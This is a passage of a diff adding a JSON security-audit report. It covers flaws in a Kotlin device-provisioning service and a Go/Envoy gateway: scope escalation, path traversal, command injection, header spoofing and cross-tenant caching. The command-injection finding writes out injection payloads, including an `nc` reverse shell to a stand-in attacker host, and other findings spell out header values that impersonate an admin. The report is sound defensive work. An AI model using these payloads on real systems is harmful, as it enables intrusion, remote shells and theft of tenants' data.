+      "impact": "A single string prefix in a token subject confers devices:read, devices:write and firmware:publish simultaneously. Every route that calls requireScope with the default allowServiceToken=true is affected: GET/POST /api/devices, /api/enrollment/bulk, /api/enrollment/{serial}/retry, /api/firmware, /api/firmware/publish and /api/firmware/artifact/{name}. Only /api/devices/{serial}/decommission opts out (Devices.kt:108).",
+      "recommendation": "Give service principals real scopes and evaluate them with the same code path as operators; use the prefix only for the audit label the comment describes. If service tokens must be broad, express that as an explicit scope set in the token, not as a naming convention.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Permissions.kt:10-48 verified; subject assignment at Token.kt:55; the one opt-out call site at Devices.kt:108."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the JWT `sub` claim read at Permissions.kt:33. Its value is the client_id form field at Token.kt:36 for locally minted tokens, and an IdP-issued subject otherwise."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). requireScope is the authorisation function for the whole authenticated surface."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The unconditional grant is inside requireScope; callers pass the scope they need correctly."
+        }
+      ]
+    },
+    {
+      "title": "Token endpoint mints whatever scope the client asks for",
+      "location": {
+        "path": "fleet-provision/src/main/kotlin/com/fleet/routes/Token.kt",
+        "symbol": "tokenRoutes /oauth/token",
+        "line": 38
+      },
+      "class": "Privilege escalation",
+      "severity": "high",
+      "status": "probable",
+      "evidence": "`val scope = form[\"scope\"] ?: \"devices:read\"` is copied verbatim into the issued token (`.withClaim(\"scope\", scope)`, line 56). Client authentication proves only that the caller knows the secret for that client_id (lines 45-49); nothing maps a client to the scopes it is entitled to, and there is no allowlist, intersection or per-client registration of permitted scopes. A caller sends `scope=devices:write firmware:publish` and receives it.",
+      "impact": "Every client credential in the system is equivalent to the most privileged one. A read-only automation client can mint a token bearing firmware:publish and move a fleet update channel. Marked probable rather than confirmed because this service's own verifier is JWKS-based (Application.kt:39-50), so the HS256 token signed here with config.signingSecret would not validate against it - the escalation lands on any relying party that validates the shared fleet.signingSecret for audience 'fleet-api', which is outside this tree.",
+      "recommendation": "Store the scopes each client is entitled to alongside its secret and issue the intersection of requested and entitled scopes, rejecting the request if the intersection is empty. Separately, reconcile issuance and verification: this service signs HS256 with a shared secret while verifying against a JWKS, which means one of the two is dead code and the other is unguarded.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Token.kt:32-69 verified; the verifier configuration verified at Application.kt:39-56."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `form[\"scope\"]` at Token.kt:38 - a form field of the POST /oauth/token request, flowing unmodified to the signed claim at line 56."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The scope-copy is unambiguous, but end-to-end exploitation against this service could not be demonstrated because its own verifier resolves keys from the JWKS rather than the HMAC secret; status therefore probable."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Scope entitlement is the core of an OAuth client-credentials grant, not an optional hardening step."
+        }
+      ]
+    },
+    {
+      "title": "Firmware artifact name is joined onto the firmware directory with no containment check",
+      "location": {
+        "path": "fleet-provision/src/main/kotlin/com/fleet/routes/Firmware.kt",
+        "symbol": "firmwareRoutes /artifact/{name}",
+        "line": 64
+      },
+      "class": "Path traversal",
+      "severity": "high",
+      "status": "probable",
+      "evidence": "`val name = call.parameters[\"name\"].orEmpty(); val artifact = File(config.firmwareDir, name)` followed by `call.respondFile(artifact)`. There is no normalisation, no canonicalisation and no assertion that the resolved file is inside config.firmwareDir - Ktor's own static file serving uses combineSafe for exactly this reason, and it is absent here. Ktor decodes path parameter values after route matching, so percent-encoded separators and dot segments in {name} reach File() as literal '/' and '..'.",
+      "impact": "Arbitrary file read from the service's filesystem - configuration, secrets mounted into the container, or /proc entries - returned over HTTP to any caller holding firmware:read, which includes every subject whose token subject starts with 'svc-' (see the requireScope finding). Marked probable because the exact encoding required depends on Ktor's decode ordering, which could not be exercised offline; the missing containment check is confirmed by reading the code.",
+      "recommendation": "Resolve and verify containment before serving: canonicalise the path and require it to start with the canonicalised firmware directory, or use Ktor's combineSafe / staticFiles. Better, look the artifact name up in FirmwareCatalog and serve only names that appear in a published release.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Firmware.kt:60-70 verified; firmwareDir origin at Config.kt:46 and application.conf:23-24."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `call.parameters[\"name\"]` at Firmware.kt:63 - a URL path segment supplied by the caller."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). No Kotlin/Gradle toolchain and no network offline, so the traversal could not be executed; the finding rests on the absent containment check rather than on a demonstrated payload. Status probable."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). There is no mitigation to credit: the isFile check only confirms the resolved target exists."
+        }
+      ]
+    },
+    {
+      "title": "Enrolment endpoints overwrite existing device records with no per-device authorization",
+      "location": {
+        "path": "fleet-provision/src/main/kotlin/com/fleet/routes/Devices.kt",
+        "symbol": "deviceRoutes /enroll",
+        "line": 85
+      },
+      "class": "Broken access control",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "POST /api/devices/enroll calls no requireScope at all - attestation is the only gate - and DeviceRegistry.enroll performs an unconditional `devices[serial] = device` (Devices.kt:52-53), replacing any existing record for that serial including its publicKey. POST /api/enrollment/bulk reaches the same writer for up to 500 devices per request behind only requireScope(\"devices:write\") and performs no attestation whatsoever; its comment claims 'The pallet is sealed and signed as a whole on the line', but palletId is only echoed back (Enrollment.kt:39) and no signature over the manifest is ever read or verified. GET /api/devices/{serial}/nonce (Devices.kt:80-83) likewise has no scope check, so nonces can be minted for any serial.",
+      "impact": "A caller with devices:write - or any 'svc-' subject - re-registers arbitrary serials, including ones already provisioned, binding them to attacker-chosen public keys. The device identity a serial represents can therefore be silently reassigned, and the bulk path does it 500 at a time with no attestation in the loop.",
+      "recommendation": "Require an explicit scope on /enroll and on the nonce endpoint. Make enrolment create-only: reject a serial that already exists unless an explicit re-provisioning operation is invoked, and verify the pallet signature the bulk comment claims exists before trusting a manifest.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Devices.kt:73-115 and Enrollment.kt:20-59 verified; the absence of a scope check on /enroll and on the nonce route confirmed by reading both handlers in full."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `call.receive<EnrollRequest>()` at Devices.kt:86 and `call.receive<BulkEnrollRequest>()` at Enrollment.kt:30 - request bodies carrying caller-chosen serials and public keys."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Overwriting a provisioned device's key material is a primary integrity concern, not defence-in-depth."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 10 (refine_code_paths_strictly); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). code_paths narrowed to the handler and the writer it calls; the two routes share one root cause (an unconditional map assignment reachable without per-device authorisation)."
+        }
+      ]
+    },
+    {
+      "title": "Diagnostic host parameter is concatenated into a shell command",
+      "location": {
+        "path": "mesh-gateway/service/diag.go",
+        "symbol": "server.handleDiag",
+        "line": 24
+      },
+      "class": "Command injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "`exec.CommandContext(ctx, \"sh\", \"-c\", \"ping -c 1 -W 2 \"+host)` where host is `r.URL.Query().Get(\"host\")` (line 15). The only validation is a non-empty check. Because the command is handed to `sh -c`, every shell metacharacter in host is interpreted: `?host=x;id`, `?host=$(cat /etc/passwd)` or `?host=x|nc attacker 4444 -e sh`. CombinedOutput is then returned to the caller in the JSON response (line 28), so the command's stdout and stderr come back in-band.",
+      "impact": "Remote command execution in the object service container as the process user, with the output echoed to the attacker. The container holds the object store volume (/var/lib/objects) and the service is the upstream for every tenant's data. Reachability is not limited to the mesh: docker-compose publishes the service's own port 8081 to the host, bypassing Envoy and its RBAC policy entirely.",
+      "recommendation": "Do not use a shell. Call the binary directly with an argument vector - `exec.CommandContext(ctx, \"ping\", \"-c\", \"1\", \"-W\", \"2\", host)` - and validate host against a hostname/IP grammar first. Do not return raw command output to the caller.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). diag.go:14-30 verified; route registration at main.go:120."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `r.URL.Query().Get(\"host\")` at diag.go:15 - an HTTP query parameter reaching the sh -c string with no transformation."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 8 (intrinsic_security_flaws); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). A direct injection path in the function's own logic, valid under rule 08 independently of who calls it."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). A single GET reproduces it; no timing or environmental precondition."
+        }
+      ]
+    },
+    {
+      "title": "partner virtual host disables ext_authz and does not strip client-supplied identity headers",
+      "location": {
+        "path": "mesh-gateway/envoy/envoy.yaml",
+        "symbol": "partner_vh typed_per_filter_config",
+        "line": 81
+      },
+      "class": "Authentication bypass / identity spoofing",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The public virtual host removes the three identity headers on the way in (request_headers_to_remove: x-fleet-user / x-fleet-roles / x-fleet-tenant, lines 63-66) with the comment 'Identity is stamped by sessiond, never by the client'. partner_vh carries no such list, and it also sets ExtAuthzPerRoute disabled: true (lines 78-81), so no session check runs for it either. Both virtual hosts are served by the same 0.0.0.0:8080 listener (line 9) and are selected purely by the Host header (domains: partners.example.com, line 74). Upstream, the Go service derives the entire principal from those headers with no verification: `r.Header.Get(\"X-Fleet-User\")`, `X-Fleet-Tenant` and a comma-split `X-Fleet-Roles` (auth.go:22-37), and Principal.HasRole treats the literal role 'admin' as satisfying any requested role (auth.go:41).",
+      "impact": "Any client that sets `Host: partners.example.com` reaches /v1/ with no session check and with identity headers of its own choosing. Sending `X-Fleet-User: x`, `X-Fleet-Tenant: <victim>`, `X-Fleet-Roles: admin` yields full read and write over any tenant's objects: requireRole's Anonymous() and HasRole() checks (auth.go:52-62) both pass. The mTLS the comment relies on is terminated at a load balancer that is not part of this configuration and leaves no evidence Envoy checks.",
+      "recommendation": "Apply request_headers_to_remove for the identity headers at the listener or route-configuration level so it cannot be forgotten per virtual host. If partners really are authenticated by client certificate, make Envoy require and forward that identity (validation_context + a header derived from the cert) rather than disabling ext_authz. Have the Go service reject requests lacking a proof it can verify.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). envoy.yaml:57-86 verified in full, including the presence of request_headers_to_remove on public_vh and its absence on partner_vh; auth.go:22-46 verified."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the inbound HTTP headers read at auth.go:24/33/34, reaching the proxy on the partner virtual host without the removal list that public_vh applies."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This is the authentication boundary itself, not a missing hardening header."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The mitigation that exists (public_vh's header strip) is credited; the finding is that it is scoped to one virtual host while the trust it establishes is assumed by the upstream for all traffic."
+        }
+      ]
+    },
+    {
+      "title": "Object service publishes its own port to the host, bypassing the Envoy edge and its policies",
+      "location": {
+        "path": "mesh-gateway/docker-compose.yml",
+        "symbol": "services.objects.ports",
+        "line": 27
+      },
+      "class": "Exposed internal service",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The objects service declares `ports: - \"8081:8081\"`, binding the container's listener to the host. The edge service is the only component intended to be reachable (`ports: - \"8080:8080\"`, line 10), and every control in this system lives in Envoy: the RBAC DENY policy for the operator surface (envoy.yaml:18-33) and the ext_authz session check that stamps the identity headers (lines 34-53). The Go service implements none of them - it has no session verification of its own and reads identity from headers (auth.go:22-37). By contrast, sessiond declares no ports at all and is reachable only on the mesh network, which is the pattern the objects service does not follow.",
+      "impact": "Every Envoy-enforced control is bypassed by connecting to :8081 directly. That includes the RBAC policy protecting /internal/ (so the command-injection endpoint at /internal/diag is directly reachable), the ext_authz session check, and the public_vh header strip - so the caller sets X-Fleet-User, X-Fleet-Tenant and X-Fleet-Roles: admin themselves and operates as any tenant.",
+      "recommendation": "Remove the ports mapping from the objects service so it is reachable only over the mesh network, as sessiond already is. If a debugging port is needed, bind it to 127.0.0.1. Independently, do not let the upstream depend solely on the proxy: have it verify a token or mTLS identity that only the edge can present.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). docker-compose.yml:18-30 verified against services.edge (lines 4-16) and services.sessiond (lines 32-38); the controls it bypasses verified at envoy.yaml:17-53."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: any TCP connection to host port 8081, which delivers directly to main.go's mux (main.go:113-125) with the caller's own headers intact at auth.go:22."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Not a hardening nicety: this exposure defeats the only authentication and authorisation layer in the deployment."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 6 (evaluate_questionable_file_paths); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). docker-compose.yml is the deployment definition for this component, not a sample or test fixture."
+        }
+      ]
+    },
+    {
+      "title": "Envoy RBAC guards the /admin/ prefix while the service routes /admin exactly",
+      "location": {
+        "path": "mesh-gateway/envoy/envoy.yaml",
+        "symbol": "rbac operator-surface permissions",
+        "line": 28
+      },
+      "class": "Policy bypass",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The DENY policy matches `url_path: { path: { prefix: \"/admin/\" } }` - with a trailing slash - for principals outside 10.20.0.0/16. The Go service registers the operator surface at `mux.HandleFunc(\"/admin\", srv.handleAdmin)` (main.go:118). A Go ServeMux pattern without a trailing slash is an exact match, so /admin is the only path that reaches handleAdmin, and /admin does not carry the prefix /admin/ - the policy never matches the reachable path. The /internal/ policy on the line above does not have this problem because /internal/stats, /internal/diag and /internal/resolve all begin with /internal/.",
+      "impact": "The whole operator surface is reachable from the public internet through the edge listener. handleAdmin performs no authorisation of its own (see the next finding), so a POST to https://api.example.com/admin reaches restore, purge-cache and usage, and a GET dumps the full cross-tenant metadata snapshot.",
+      "recommendation": "Match both forms - add a `path: { exact: \"/admin\" }` permission alongside the prefix, or normalise on the service side by registering \"/admin/\" and redirecting. Better, express the policy as an ALLOW list for the public surface rather than a DENY list for the operator surface, so an unmatched path fails closed.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). envoy.yaml:21-33 and main.go:113-121 verified; the trailing-slash difference is exact and the /internal/ counterexample confirms the pattern is deliberate elsewhere."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the request path itself, evaluated by the RBAC filter at envoy.yaml:27-28 and by the mux at main.go:118; the caller chooses it."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The mitigation is real and correctly written for /internal/; the finding is that its /admin/ half does not match the path that exists, which was checked rather than assumed."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This is the network-level access control on the operator surface."
+        }
+      ]
+    },
+    {
+      "title": "handleAdmin performs no authorization and exposes restore, usage and snapshot to any caller that reaches it",
+      "location": {
+        "path": "mesh-gateway/service/admin.go",
+        "symbol": "server.handleAdmin",
+        "line": 22
+      },
+      "class": "Missing authorization",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "handleAdmin never calls requireRole or principalFrom - the file contains no reference to either, while every branch of handleObject does (main.go:58, 76). A GET falls through to adminOverview, which writes `s.store.Snapshot()` - a JSON marshal of the entire s.meta map for all tenants (store.go:122-126). A POST dispatches on a body field: 'usage' lists objects for `req.Tenant`, a tenant name taken from the request body rather than from any principal (admin.go:41); 'restore' writes caller-supplied objects; 'purge-cache' flushes the response cache. The service relies entirely on the Envoy RBAC policy, which does not match this path (previous finding) and is bypassed altogether by the published port.",
+      "impact": "Full cross-tenant metadata disclosure via GET, arbitrary per-tenant listing via the usage action, and arbitrary object writes via restore - all without a principal. Because the Envoy policy does not cover /admin and the service port is published to the host, this is reachable both from the internet through the edge and directly.",
+      "recommendation": "Call requireRole(w, r, \"admin\") at the top of handleAdmin and derive the tenant for the usage action from the resolved principal rather than from req.Tenant. Defence in depth at the service layer should not be optional simply because a proxy policy is expected to exist.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). admin.go read in full (69 lines, no authorisation call anywhere); contrast verified at main.go:58 and 76; Snapshot at store.go:122-126."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the decoded request body at admin.go:28-32 (`req.Action`, `req.Tenant`, `req.Objects`) and the request method at line 23."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Missing authorisation on the operator surface is a primary control; the module comment calls it 'the whole operator surface'."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The expected mitigation (the edge RBAC policy) was examined and found not to match this path."
+        }
+      ]
+    },
+    {
+      "title": "Response cache is keyed on the URL path only, serving one tenant's objects to another",
+      "location": {
+        "path": "mesh-gateway/service/cache.go",
+        "symbol": "withCache",
+        "line": 81
+      },
+      "class": "Cross-tenant data exposure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "`key := r.URL.Path` - the cache key contains no tenant, user or role component, while the handler it fronts is tenant-scoped: handleObject resolves the tenant from the request principal and enforces `meta.Tenant != p.Tenant -> 404` (main.go:66-70). withCache wraps the entire mux (main.go:125), and on a hit it writes the stored body and returns before calling next.ServeHTTP (cache.go:82-92), so requireRole and the tenant comparison never execute. Only 200 responses are stored (line 97), which is exactly the set of successful, tenant-scoped reads; the recorder's status stays 200 for the object GET path because that handler writes the body without calling WriteHeader.",
+      "impact": "For 20 seconds after any successful read, GET /v1/objects/<key> returns the first tenant's object bytes and its X-Object-Checksum to every subsequent caller, including unauthenticated ones - the 401 from requireRole is never reached on a hit. The listing endpoint is worse: GET /v1/objects/ caches s.store.List(p.Tenant) under the key '/v1/objects/', so one tenant's complete object inventory is served to all others.",
+      "recommendation": "Include the principal in the key (tenant at minimum, plus roles if the response varies by role), or do not cache authenticated responses at all. If the listing query is the cost driver, cache it inside the store keyed by tenant, after authorisation, rather than caching the rendered HTTP response in front of it.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). cache.go:74-104 and main.go:53-96/125 verified; the recorder's status behaviour verified at cache.go:57-71 against the write path at main.go:71-73."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `r.URL.Path` at cache.go:81 - the request path, which the attacker chooses and which constitutes the entire key."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The key construction is inside withCache; the handler it wraps behaves correctly when it is reached."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Two GETs of the same path inside the 20s TTL reproduce it deterministically."
+        }
+      ]
+    },
+    {
+      "title": "putRaw writes caller-supplied metadata, skipping the ownership check, quota accounting and checksum recomputation",
+      "location": {
+        "path": "mesh-gateway/service/store.go",
+        "symbol": "Store.putRaw",
+        "line": 78
+      },
+      "class": "Broken access control / integrity bypass",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "Put enforces three things before writing: `existing.Tenant != meta.Tenant -> errNotOwner` (line 56), the quota comparison (line 59), and recomputation of Size and Checksum from the body (lines 63-65). putRaw does none of them - it writes the blob and then assigns `s.meta[meta.Key] = meta` with the metadata exactly as handed in. Its caller, restoreSnapshot, passes `entry.Meta` straight from the decoded request body (admin.go:60-61), so Key, Tenant, Owner, Size and Checksum are all attacker-chosen. The docstring 'the metadata comes from a previous export of this same store' is an assumption the code never verifies.",
+      "impact": "Through the unauthenticated /admin restore action, any caller can overwrite any object key regardless of which tenant owns it, re-point an existing key at a different tenant (after which Store.Get resolves the blob path from the injected meta.Tenant, store.go:105), inflate or corrupt usage accounting to deny other tenants their quota, and store a body whose advertised X-Object-Checksum (main.go:72) does not match its contents - breaking integrity verification for every client that trusts that header.",
+      "recommendation": "Have restoreSnapshot go through Put so the ownership and quota checks apply, or authenticate the snapshot itself (sign exports and verify the signature before loading). Always recompute Size and Checksum from the bytes actually written rather than accepting them from the input.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). store.go:52-96 verified side by side; caller at admin.go:58-68; checksum surfaced to clients at main.go:72."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `req.Objects` decoded at admin.go:29 and dereferenced as entry.Meta / entry.Body at line 61."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). restoreSnapshot is the only caller and is an HTTP handler in this tree; this is not a hypothetical misuse of a safe primitive."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 5 (no_security_flaw_stretching); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Put's checks are credited as effective; the finding is that a sibling function reachable from the same surface omits them."
+        }
+      ]
+    },
+    {
+      "title": "Store.Get ignores its tenant argument and object metadata is keyed globally",
+      "location": {
+        "path": "mesh-gateway/service/store.go",
+        "symbol": "Store.Get",
+        "line": 98
+      },
+      "class": "Trust-boundary confusion",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "`func (s *Store) Get(tenant, key string) ([]byte, ObjectMeta, error)` never reads `tenant`; it looks up s.meta[key] in a single global map and reads the blob from s.pathFor(meta.Tenant, key). The tenant check lives entirely at the call site (main.go:67, `meta.Tenant != p.Tenant`), so a signature that advertises tenant scoping does not provide it. The same global keyspace means s.meta, s.usage and Put's ownership check (store.go:56) are all keyed by bare object key rather than by (tenant, key).",
